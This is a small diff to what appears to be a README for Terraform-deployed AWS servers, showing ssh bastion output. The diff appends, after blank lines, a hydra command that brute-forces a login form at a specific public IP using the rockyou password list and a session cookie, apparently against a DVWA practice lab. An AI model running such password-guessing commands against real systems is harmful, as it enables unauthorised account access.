@@ -62,3 +62,7 @@ The output will look similar to below, it will allow you to ssh to the servers
 
 bastion_ip = "ssh ec2-user@ec2-18-206-46-176.compute-1.amazonaws.com"
 
+
+
+
+hydra 54.81.183.238 -l admin -P rockyou.txt http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=aap914245a1besu76ur8i6qvp4"
